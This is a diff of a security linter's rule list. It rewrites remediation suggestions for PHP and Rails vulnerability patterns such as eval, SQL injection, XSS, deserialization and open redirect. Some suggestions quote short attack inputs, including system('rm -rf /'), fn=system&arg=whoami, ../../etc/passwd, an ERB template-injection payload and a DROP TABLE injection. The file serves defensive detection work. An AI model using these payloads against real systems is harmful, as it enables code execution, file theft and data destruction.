-                "Security or quality issue: preg_replace with /e modifier evaluates replacement as PHP code enabling code injection. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "preg_replace with /e modifier evaluates the replacement as PHP code — removed in PHP 7.0 because it's an RCE vector. Use preg_replace_callback: preg_replace_callback($pattern, function($matches) { return strtoupper($matches[1]); }, $input);"
             ),
     },
     {
@@ -26133,7 +26133,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "PHP assert() with user input evaluates string as code enabling remote code execution",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Command injection via unsanitized input in shell execution. Never construct shell commands from user input. Use: subprocess.run() with argument list (Python), execFile() (Node.js), exec.Command() with separate args (Go). If shell is unavoidable: use shlex.quote() (Python) or shell-escape library to sanitize each argument."
+                "assert($userInput) in PHP 5-7 evaluates the string as PHP code. An attacker sends: system('rm -rf /'). In PHP 8: assert() only accepts boolean expressions, but remove dynamic assert calls entirely. Use proper validation: if (!condition) throw new InvalidArgumentException();"
             ),
     },
     {
@@ -26142,7 +26142,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "create_function uses eval internally and is deprecated; use anonymous functions instead",
         "severity": Severity.WARN,
             "suggestion": (
-                "Deprecated API or pattern — will be removed in a future version, potentially breaking your application without warning. Migrate to the recommended replacement now. Check the library's migration guide for the specific replacement and any behavioral differences."
+                "create_function('$x', $userInput) uses eval internally — it creates a function from a string. Removed in PHP 8.0. Use anonymous functions: $fn = function($x) use ($param) { return $x * $param; };"
             ),
     },
     {
@@ -26151,7 +26151,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Variable function call with user input enables arbitrary function invocation",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Input validation must happen at system boundaries. Validate: type (is it a string/number?), format (does it match expected pattern?), range (is it within bounds?), and length. Use allowlists over denylists. Validate on the server — client validation is for UX only."
+                "$func = $_GET['fn']; $func(); calls any PHP function the attacker chooses: fn=phpinfo or fn=system&args=whoami. Validate against an allowlist: $allowed = ['process', 'validate']; if (in_array($func, $allowed, true)) { $func(); }"
             ),
     },
     {
@@ -26160,7 +26160,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "MD5 or SHA1 for password hashing is insecure; use password_hash with PASSWORD_BCRYPT",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Hardcoded secrets in source code are visible to anyone with repository access and persist in git history forever. Use environment variables: os.environ['API_KEY']. For production: use a secrets manager (AWS Secrets Manager, HashiCorp Vault, GCP Secret Manager). If committed: rotate the secret immediately — git history cannot be reliably purged."
+                "md5($password) or sha1($password) is crackable in seconds (GPU: ~10B MD5/s). Use: $hash = password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]); Verify: password_verify($input, $stored_hash). PASSWORD_BCRYPT handles salt automatically."
             ),
     },
     {
@@ -26169,7 +26169,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "mysql_* functions are removed in PHP 7+; use PDO or mysqli with prepared statements",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "String concatenation in SQL queries allows injection. An input of ' OR 1=1-- returns all rows. Use parameter binding: db.execute('SELECT * FROM t WHERE col = ?', [value]). Never build SQL with + or string joining. ORMs have safe query builders — use them."
+                "mysql_* functions were removed in PHP 7.0 — no prepared statements, no parameterization. Use PDO: $stmt = $pdo->prepare('SELECT * FROM t WHERE id = ?'); $stmt->execute([$id]); or MySQLi: $stmt = $mysqli->prepare('...'); $stmt->bind_param('i', $id);"
             ),
     },
     {
@@ -26178,7 +26178,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Open redirect via user-controlled Location header enables phishing attacks",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Open redirect via user-controlled URL. An attacker crafts: /redirect?url=https://evil.com which looks like it comes from your domain. Validate redirect targets against an allowlist of permitted domains. For relative redirects: use url.startswith('/') and block '//' (protocol-relative URLs). Never redirect to user-provided absolute URLs."
+                "header('Location: ' . $_GET['url']) redirects to any URL including attacker-controlled domains. Validate: $allowed = ['/', '/dashboard', '/profile']; if (in_array($url, $allowed, true)) { header('Location: ' . $url); } else { header('Location: /'); }"
             ),
     },
     {
@@ -26187,7 +26187,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Direct output of user input without htmlspecialchars enables reflected XSS",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Cross-site scripting (XSS) via unsanitized user input in HTML context. Sanitize output based on context: HTML body: escape <>&\'' characters. HTML attributes: quote and escape. JavaScript: JSON.stringify(). URL: encodeURIComponent(). Use DOMPurify for HTML, or framework auto-escaping (React JSX, Vue templates)."
+                "echo $_GET['name'] reflects user input directly into HTML — XSS. Use: echo htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8'). For JSON context: json_encode(). For URL context: urlencode(). Always escape output based on the output context."
             ),
     },
     {
@@ -26196,7 +26196,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "File operation with user-controlled path enables arbitrary file read/write",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "User input in file paths enables path traversal. An input of ../../etc/passwd reads system files. Use os.path.realpath() and verify the resolved path starts with your allowed base directory: resolved = os.path.realpath(os.path.join(base, user_input)); assert resolved.startswith(os.path.realpath(base)). Use pathlib for cleaner path handling."
+                "file_get_contents($_GET['path']) reads any file: path=../../../../etc/passwd. Use basename(): $safe = basename($_GET['file']); $path = '/uploads/' . $safe; Or use realpath() and verify prefix: $real = realpath($path); if (strpos($real, '/uploads/') !== 0) abort();"
             ),
     },
     {
@@ -26205,7 +26205,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "SimpleXML without LIBXML_NOENT and LIBXML_NONET flags is vulnerable to XXE attacks",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Security or quality issue: SimpleXML without LIBXML_NOENT and LIBXML_NONET flags is vulnerable to XXE attacks. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "simplexml_load_string($xml) without flags processes DTD and external entities (XXE). Use: simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT | LIBXML_NONET | LIBXML_DTDLOAD). Or globally: libxml_disable_entity_loader(true) (deprecated in PHP 8, use flags instead)."
             ),
     },
     {
@@ -26214,7 +26214,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "session_regenerate_id(false) keeps old session file enabling session fixation",
         "severity": Severity.WARN,
             "suggestion": (
-                "Authentication or authorization vulnerability. Verify: authentication checks on every protected endpoint, authorization checks for resource access (not just authentication), secure token storage, and proper session invalidation on logout."
+                "session_regenerate_id(false) creates a new session ID but keeps the old session file — an attacker who knows the old ID can still use it. Use session_regenerate_id(true) which deletes the old session file. Call on every privilege escalation (login, role change)."
             ),
     },
     {
@@ -26223,7 +26223,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Displaying errors in production leaks sensitive information about application internals",
         "severity": Severity.WARN,
             "suggestion": (
-                "SQL injection via string interpolation. The database driver sees the user's input as SQL code, not data. Use parameterized queries: cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,)). The %s placeholder is never interpreted as SQL — the driver sends it as a bound parameter. This applies to all SQL variants: %s (psycopg2), ? (sqlite3), $1 (asyncpg)."
+                "display_errors=On in production shows: file paths, SQL queries, stack traces, and sometimes credentials in error messages. Set: display_errors=Off, log_errors=On, error_log=/var/log/php/error.log. Show users a generic error page."
             ),
     },
     {
@@ -26232,7 +26232,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "json_decode returning objects instead of arrays may enable property injection attacks",
         "severity": Severity.INFO,
             "suggestion": (
-                "Security or quality issue: json_decode returning objects instead of arrays may enable property injection attacks. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "json_decode($input) returns an object with dynamic properties — $data->isAdmin may be set by the attacker. Use json_decode($input, true) for associative arrays, then validate: $name = $data['name'] ?? ''; Never trust decoded JSON structure without validation."
             ),
     },
     {
@@ -26241,7 +26241,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Using uploaded file name or MIME type from client without validation enables upload attacks",
         "severity": Severity.WARN,
             "suggestion": (
-                "File upload without validation allows arbitrary file types and path manipulation. Validate: file extension against an allowlist, MIME type (check magic bytes, not just header), file size limit. Store with generated filenames (uuid4), never user-provided names. Serve uploaded files from a separate domain/CDN to prevent XSS."
+                "Trusting $_FILES['file']['name'] or $_FILES['file']['type'] from the client allows path traversal and MIME type spoofing. Generate filenames: $name = bin2hex(random_bytes(16)) . '.jpg'; Validate MIME with finfo_file() on the actual file content, not the header."
             ),
     },
     {
@@ -26250,7 +26250,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Upload destination path from user input enables arbitrary file placement on server",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "File upload without validation allows arbitrary file types and path manipulation. Validate: file extension against an allowlist, MIME type (check magic bytes, not just header), file size limit. Store with generated filenames (uuid4), never user-provided names. Serve uploaded files from a separate domain/CDN to prevent XSS."
+                "move_uploaded_file($tmp, $_POST['dest']) writes to any path the attacker chooses. Use a fixed upload directory: $dest = '/uploads/' . basename($safe_name); Never let user input determine the destination directory."
             ),
     },
     {
@@ -26259,7 +26259,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "call_user_func with user input enables arbitrary function invocation",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Input validation must happen at system boundaries. Validate: type (is it a string/number?), format (does it match expected pattern?), range (is it within bounds?), and length. Use allowlists over denylists. Validate on the server — client validation is for UX only."
+                "call_user_func($_GET['fn'], $_GET['arg']) calls any PHP function. An attacker sends fn=system&arg=whoami. Validate against an allowlist: $handlers = ['format' => 'formatData', 'validate' => 'validateInput']; call_user_func($handlers[$action] ?? 'defaultHandler', $arg);"
             ),
     },
     {
@@ -26268,7 +26268,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "is_numeric allows hex strings which can bypass SQL injection filters in older PHP",
         "severity": Severity.WARN,
             "suggestion": (
-                "SQL injection risk. User input in query strings is interpreted as SQL code. Use parameterized queries with your driver's placeholder syntax: %s (Python), ? (JS/Go), $1 (PostgreSQL). The fix is always the same: separate data from code by using bound parameters."
+                "is_numeric('0x61646d696e') returns true in PHP 5 — hex strings bypass numeric checks and can be injected into SQL. Use ctype_digit($input) for integer validation, or filter_var($input, FILTER_VALIDATE_INT) with explicit range options."
             ),
     },
     {
@@ -26277,7 +26277,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Cookie set without httponly and secure flags is vulnerable to XSS theft and MITM",
         "severity": Severity.WARN,
             "suggestion": (
-                "Cross-site scripting (XSS) via unsanitized user input in HTML context. Sanitize output based on context: HTML body: escape <>&\'' characters. HTML attributes: quote and escape. JavaScript: JSON.stringify(). URL: encodeURIComponent(). Use DOMPurify for HTML, or framework auto-escaping (React JSX, Vue templates)."
+                "setcookie('session', $id) without flags: not HTTPS-only, accessible to JavaScript, sent on cross-site requests. Use: setcookie('session', $id, ['httponly' => true, 'secure' => true, 'samesite' => 'Lax', 'path' => '/']);"
             ),
     },
     {
@@ -26286,7 +26286,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Dynamic extension loading or shutdown function from variable enables code injection",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Security or quality issue: Dynamic extension loading or shutdown function from variable enables code injection. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "dl($userInput) loads arbitrary PHP extensions — an attacker loads a malicious .so file. dl() is disabled in most production configurations (enable_dl=Off). Never use dl() with user input. If dynamic loading is needed: validate against a hardcoded list of allowed extensions."
             ),
     },
     {
@@ -26295,7 +26295,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Merging user input array into application data enables mass assignment of internal values",
         "severity": Severity.WARN,
             "suggestion": (
-                "Input validation must happen at system boundaries. Validate: type (is it a string/number?), format (does it match expected pattern?), range (is it within bounds?), and length. Use allowlists over denylists. Validate on the server — client validation is for UX only."
+                "array_merge($config, $_POST) overwrites any config key with user input: $_POST['debug'] = true, $_POST['admin'] = true. Allowlist: $allowed = array_intersect_key($_POST, array_flip(['name', 'email'])); $config = array_merge($config, $allowed);"
             ),
     },
     {
@@ -26304,7 +26304,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Sleep duration from user input enables denial-of-service via thread exhaustion",
         "severity": Severity.WARN,
             "suggestion": (
-                "Concurrency issue — unsynchronized access to shared mutable state. For databases: use transactions. For in-memory: use threading.Lock() (Python), sync.Mutex (Go), or synchronized/ReentrantLock (Java). For distributed systems: use Redis SETNX or database advisory locks for distributed locking."
+                "sleep((int)$_GET['delay']) lets an attacker send delay=999999, tying up a PHP worker for days. Validate and cap: $delay = min(max((int)$_GET['delay'], 0), 5); If user-controlled delays are needed: use async queues, not synchronous sleep."
             ),
     },
     {
@@ -26313,7 +26313,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "parse_str without second parameter overwrites variables in current scope",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Security or quality issue: parse_str without second parameter overwrites variables in current scope. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "parse_str($_GET['data']) without second parameter overwrites all variables in the current scope: data=isAdmin%3D1. Always use the second parameter: parse_str($input, $result); $name = $result['name'] ?? ''; This isolates parsed values in $result."
             ),
     },
     {
@@ -26322,7 +26322,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "mb_ereg_replace with e flag evaluates replacement as PHP code enabling injection",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Security or quality issue: mb_ereg_replace with e flag evaluates replacement as PHP code enabling injection. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "mb_ereg_replace with /e flag evaluates replacement as PHP code — same RCE vector as preg_replace /e. Use mb_ereg_replace_callback: mb_ereg_replace_callback($pattern, function($matches) { return strtoupper($matches[0]); }, $input);"
             ),
     },
     {
@@ -26331,7 +26331,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Mass assignment of role or admin attributes via attr_accessible enables privilege escalation",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Follow the principle of least privilege: grant only the minimum permissions required for the operation. Validate authorization on every request, not just authentication. Use role-based access control (RBAC) with specific permissions per role."
+                "Rails attr_accessible :role or permit(:role) in strong parameters allows users to set their own role. Remove role from mass-assignable attributes. Set role explicitly: user.update(permitted_params); user.role = current_user.admin? ? params[:role] : user.role;"
             ),
     },
     {
@@ -26340,7 +26340,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "YAML.load deserializes arbitrary Ruby objects enabling code execution; use YAML.safe_load",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Command injection via unsanitized input in shell execution. Never construct shell commands from user input. Use: subprocess.run() with argument list (Python), execFile() (Node.js), exec.Command() with separate args (Go). If shell is unavoidable: use shlex.quote() (Python) or shell-escape library to sanitize each argument."
+                "YAML.load(user_input) in Ruby deserializes arbitrary objects — Psych/YAML can instantiate any Ruby class. An attacker sends a payload that calls system(). Use YAML.safe_load(input, permitted_classes: []) which only allows basic types (String, Integer, Array, Hash)."
             ),
     },
     {
@@ -26349,7 +26349,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Command execution with string interpolation enables shell injection attacks",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Command injection via unsanitized input in shell execution. Never construct shell commands from user input. Use: subprocess.run() with argument list (Python), execFile() (Node.js), exec.Command() with separate args (Go). If shell is unavoidable: use shlex.quote() (Python) or shell-escape library to sanitize each argument."
+                "system('grep #{params[:q]} file') interpolates user input into shell. Use: system('grep', params[:q], 'file') — multi-argument system() bypasses the shell. For Open3: Open3.capture3('grep', params[:q], 'file'). Never use string interpolation in shell commands."
             ),
     },
     {
@@ -26358,7 +26358,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Backtick command execution with interpolated params enables command injection",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Command injection via unsanitized input in shell execution. Never construct shell commands from user input. Use: subprocess.run() with argument list (Python), execFile() (Node.js), exec.Command() with separate args (Go). If shell is unavoidable: use shlex.quote() (Python) or shell-escape library to sanitize each argument."
+                "`ls #{params[:dir]}` passes to shell via backtick with interpolation. Use Open3: stdout, status = Open3.capture2('ls', params[:dir]). Backticks always invoke the shell — there is no safe way to use backtick with user input."
             ),
     },
     {
@@ -26367,7 +26367,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "ActiveRecord where clause with string interpolation enables SQL injection",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Template literal interpolation in SQL passes user input directly into the query string. Use parameterized queries: db.query('SELECT * FROM users WHERE id = $1', [userId]). For Knex: .whereRaw('col = ?', [value]). For Sequelize: use model methods or Sequelize.literal() with validated input, never template strings."
+                "User.where('name = ' + params[:name]) concatenates into SQL. Use: User.where('name = ?', params[:name]) or User.where(name: params[:name]). The hash syntax generates parameterized SQL. Never use string concatenation or interpolation in where()."
             ),
     },
     {
@@ -26376,7 +26376,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "find_by_sql with interpolated values enables SQL injection; use placeholder parameters",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Template literal interpolation in SQL passes user input directly into the query string. Use parameterized queries: db.query('SELECT * FROM users WHERE id = $1', [userId]). For Knex: .whereRaw('col = ?', [value]). For Sequelize: use model methods or Sequelize.literal() with validated input, never template strings."
+                "find_by_sql('SELECT * FROM users WHERE name = #{name}') injects. Use: find_by_sql(['SELECT * FROM users WHERE name = ?', name]). The array form parameterizes the query. Better: use ActiveRecord query interface: User.where(name: name)."
             ),
     },
     {
@@ -26385,7 +26385,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Rendering user input as text/inline template enables XSS and SSTI attacks",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Unescaped user input in templates enables XSS. Use the template engine's auto-escaping: Jinja2: {{ variable }} auto-escapes. Django: {{ variable }} auto-escapes. If you need raw HTML: sanitize first with bleach.clean(input, tags=['p','br','a']). Never use |safe or {% autoescape off %} with user input."
+                "render inline: params[:template] or render text: user_input enables server-side template injection (SSTI). An attacker sends ERB code: <%= system('whoami') %>. Never render user input as a template. Use render json: data or render plain: sanitized_text."
             ),
     },
     {
@@ -26394,7 +26394,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Marking string as html_safe bypasses Rails XSS escaping and may introduce vulnerabilities",
         "severity": Severity.WARN,
             "suggestion": (
-                "Cross-site scripting (XSS) via unsanitized user input in HTML context. Sanitize output based on context: HTML body: escape <>&\'' characters. HTML attributes: quote and escape. JavaScript: JSON.stringify(). URL: encodeURIComponent(). Use DOMPurify for HTML, or framework auto-escaping (React JSX, Vue templates)."
+                "user_input.html_safe tells Rails the string is pre-sanitized — it won't be escaped in views. If user_input contains <script>alert(1)</script>, it executes. Never call html_safe on user input. Use sanitize(input) or the raw helper only on content you generated."
             ),
     },
     {
@@ -26403,7 +26403,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "raw() helper on user-controlled content disables HTML escaping enabling XSS",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "SQL injection risk. User input in query strings is interpreted as SQL code. Use parameterized queries with your driver's placeholder syntax: %s (Python), ? (JS/Go), $1 (PostgreSQL). The fix is always the same: separate data from code by using bound parameters."
+                "raw(params[:content]) in ERB templates disables HTML escaping. Use: <%= sanitize(params[:content], tags: ['p', 'br', 'a'], attributes: ['href']) %> which allows safe HTML tags and removes dangerous ones. Default ERB escaping (<%= %>) is the safest option."
             ),
     },
     {
@@ -26412,7 +26412,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Dynamic method dispatch via send with user input enables arbitrary method invocation",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Input validation must happen at system boundaries. Validate: type (is it a string/number?), format (does it match expected pattern?), range (is it within bounds?), and length. Use allowlists over denylists. Validate on the server — client validation is for UX only."
+                "object.send(params[:method]) invokes any method including: system, exec, eval, exit. Use public_send with validation: ALLOWED = %w[process validate format]; if ALLOWED.include?(method) then object.public_send(method) end. public_send only calls public methods."
             ),
     },
     {
@@ -26421,7 +26421,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Dynamic constant resolution from user input enables arbitrary class instantiation",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Input validation must happen at system boundaries. Validate: type (is it a string/number?), format (does it match expected pattern?), range (is it within bounds?), and length. Use allowlists over denylists. Validate on the server — client validation is for UX only."
+                "Object.const_get(params[:class]) resolves any constant: Object.const_get('Kernel').system('whoami'). Validate: ALLOWED = { 'user' => UserHandler, 'order' => OrderHandler }; handler = ALLOWED.fetch(params[:type]) { raise ArgumentError }."
             ),
     },
     {
@@ -26430,7 +26430,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "eval family with user input enables arbitrary Ruby code execution",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Command injection via unsanitized input in shell execution. Never construct shell commands from user input. Use: subprocess.run() with argument list (Python), execFile() (Node.js), exec.Command() with separate args (Go). If shell is unavoidable: use shlex.quote() (Python) or shell-escape library to sanitize each argument."
+                "eval(params[:code]) / instance_eval(user_input) / class_eval(user_input) execute arbitrary Ruby. There is no safe way to eval user input. For math: use a parser (dentaku gem). For configuration: use YAML.safe_load. For dispatch: use a hash map of allowed actions."
             ),
     },
     {
@@ -26439,7 +26439,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Redirect to user-supplied URL enables open redirect phishing attacks",
         "severity": Severity.WARN,
             "suggestion": (
-                "Open redirect via user-controlled URL. An attacker crafts: /redirect?url=https://evil.com which looks like it comes from your domain. Validate redirect targets against an allowlist of permitted domains. For relative redirects: use url.startswith('/') and block '//' (protocol-relative URLs). Never redirect to user-provided absolute URLs."
+                "redirect_to params[:url] redirects to any URL including attacker domains. Validate: redirect_to(params[:url]) only if URI(params[:url]).host.nil? (relative) or ALLOWED_HOSTS.include?(URI(params[:url]).host). Use redirect_to root_path as fallback."
             ),
     },
     {
@@ -26448,7 +26448,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "CSRF protection weakened or exempted on controller actions",
         "severity": Severity.WARN,
             "suggestion": (
-                "Security or quality issue: CSRF protection weakened or exempted on controller actions. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "skip_before_action :verify_authenticity_token or protect_from_forgery except: [...] disables CSRF on specific actions. If the action accepts form data: CSRF is required. For API endpoints using token auth (not cookies): CSRF can be safely skipped."
             ),
     },
     {
@@ -26457,7 +26457,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Mail delivery errors silently swallowed makes it impossible to detect email failures",
         "severity": Severity.INFO,
             "suggestion": (
-                "Swallowed exception hides bugs. At minimum: log the error with context. Pattern: except SpecificError as exc: logger.warning('operation_failed', error=str(exc)). If recovery is possible: implement it. If not: re-raise or convert to an appropriate error type."
+                "rescue => e in mailer silently swallows delivery failures — you never know emails failed. At minimum: Rails.logger.error('Mail failed: #{e.message}'). Better: use ActionMailer::DeliveryError handling with retry logic and alerting."
             ),
     },
     {
@@ -26466,7 +26466,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Dynamic ORDER BY from user input enables SQL injection in ActiveRecord",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "SQL injection risk. User input in query strings is interpreted as SQL code. Use parameterized queries with your driver's placeholder syntax: %s (Python), ? (JS/Go), $1 (PostgreSQL). The fix is always the same: separate data from code by using bound parameters."
+                "User.order(params[:sort]) injects into ORDER BY. An attacker sends: name; DROP TABLE users--. Validate: ALLOWED_SORT = %w[name created_at email]; col = ALLOWED_SORT.include?(params[:sort]) ? params[:sort] : 'created_at'; User.order(col)."
             ),
     },
     {
@@ -26475,7 +26475,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Dynamic column selection via pluck from user input enables SQL injection",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "SQL injection risk. User input in query strings is interpreted as SQL code. Use parameterized queries with your driver's placeholder syntax: %s (Python), ? (JS/Go), $1 (PostgreSQL). The fix is always the same: separate data from code by using bound parameters."
+                "User.pluck(params[:column]) with user input allows: pluck('password_digest') to extract password hashes. Validate: ALLOWED_COLUMNS = %w[id name email]; col = ALLOWED_COLUMNS.include?(params[:col]) ? params[:col] : 'id'; User.pluck(col)."
             ),
     },
     {
@@ -26484,7 +26484,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Kernel.open with user input can execute commands via pipe; use File.open or URI.open",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Command injection via unsanitized input in shell execution. Never construct shell commands from user input. Use: subprocess.run() with argument list (Python), execFile() (Node.js), exec.Command() with separate args (Go). If shell is unavoidable: use shlex.quote() (Python) or shell-escape library to sanitize each argument."
+                "Kernel.open(params[:path]) with a pipe prefix executes commands: open('|whoami'). Use File.open(path, 'r') which only opens files. For URLs: use URI.open or Net::HTTP. Kernel.open dispatches to either file or command based on the prefix — too dangerous with user input."
             ),
     },
     {
@@ -26493,7 +26493,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Marshal.load of untrusted data enables arbitrary object instantiation and code execution",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Command injection via unsanitized input in shell execution. Never construct shell commands from user input. Use: subprocess.run() with argument list (Python), execFile() (Node.js), exec.Command() with separate args (Go). If shell is unavoidable: use shlex.quote() (Python) or shell-escape library to sanitize each argument."
+                "Marshal.load(data) deserializes arbitrary Ruby objects — crafted payloads execute code via method_missing chains. Never unmarshal untrusted data. Use JSON.parse(data) for data interchange. If Marshal is needed: sign the payload with MessageVerifier and verify before loading."
             ),
     },
     {
@@ -26502,7 +26502,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "update_all with interpolated SQL enables mass SQL injection affecting multiple records",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Template literal interpolation in SQL passes user input directly into the query string. Use parameterized queries: db.query('SELECT * FROM users WHERE id = $1', [userId]). For Knex: .whereRaw('col = ?', [value]). For Sequelize: use model methods or Sequelize.literal() with validated input, never template strings."
+                "User.where('role = ' + input).update_all(admin: true) injects into WHERE — an attacker makes all users admin with input = '1=1'. Use: User.where(role: input).update_all(admin: true). Always use parameterized where with update_all."
             ),
     },
     {
@@ -26511,7 +26511,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "MD5 or SHA1 for password hashing is cryptographically weak; use bcrypt or Argon2",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Hardcoded secrets in source code are visible to anyone with repository access and persist in git history forever. Use environment variables: os.environ['API_KEY']. For production: use a secrets manager (AWS Secrets Manager, HashiCorp Vault, GCP Secret Manager). If committed: rotate the secret immediately — git history cannot be reliably purged."
+                "Digest::MD5.hexdigest(password) or Digest::SHA1.hexdigest(password) are fast and unsalted. Use BCrypt: BCrypt::Password.create(password, cost: 12). Verify: BCrypt::Password.new(stored_hash) == input_password. Rails has_secure_password uses bcrypt by default."
             ),
     },
     {
@@ -26520,7 +26520,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Hardcoded secret_key_base enables session forgery; use environment variable",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Hardcoded secrets in source code are visible to anyone with repository access and persist in git history forever. Use environment variables: os.environ['API_KEY']. For production: use a secrets manager (AWS Secrets Manager, HashiCorp Vault, GCP Secret Manager). If committed: rotate the secret immediately — git history cannot be reliably purged."
+                "config.secret_key_base = 'hardcoded_value' in source code allows anyone to forge signed cookies and sessions. Set via environment: config.secret_key_base = ENV.fetch('SECRET_KEY_BASE'). Generate: rails secret. Rotate by setting both old and new keys temporarily."
             ),
     },
     {
@@ -26529,7 +26529,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "delete_all with string interpolation enables SQL injection for mass deletion",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Template literal interpolation in SQL passes user input directly into the query string. Use parameterized queries: db.query('SELECT * FROM users WHERE id = $1', [userId]). For Knex: .whereRaw('col = ?', [value]). For Sequelize: use model methods or Sequelize.literal() with validated input, never template strings."
+                "User.where('name LIKE ' + input).delete_all injects into mass deletion. An attacker sends input = '%%' to delete all records. Use: User.where('name LIKE ?', '%' + sanitize_sql_like(input) + '%').delete_all. sanitize_sql_like escapes % and _ wildcards."
             ),
     },
     {
@@ -26538,7 +26538,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "ActiveRecord calculate with user-controlled operation enables SQL injection",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "SQL injection risk. User input in query strings is interpreted as SQL code. Use parameterized queries with your driver's placeholder syntax: %s (Python), ? (JS/Go), $1 (PostgreSQL). The fix is always the same: separate data from code by using bound parameters."
+                "User.calculate(:sum, params[:column]) with user input allows reading any column: calculate(:sum, 'salary'). Validate: ALLOWED = %w[quantity amount]; raise unless ALLOWED.include?(params[:col]). Never pass user input as the column argument to calculate."
             ),
     },
     {
@@ -26547,7 +26547,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Debug log level in production exposes sensitive application internals",
         "severity": Severity.WARN,
             "suggestion": (
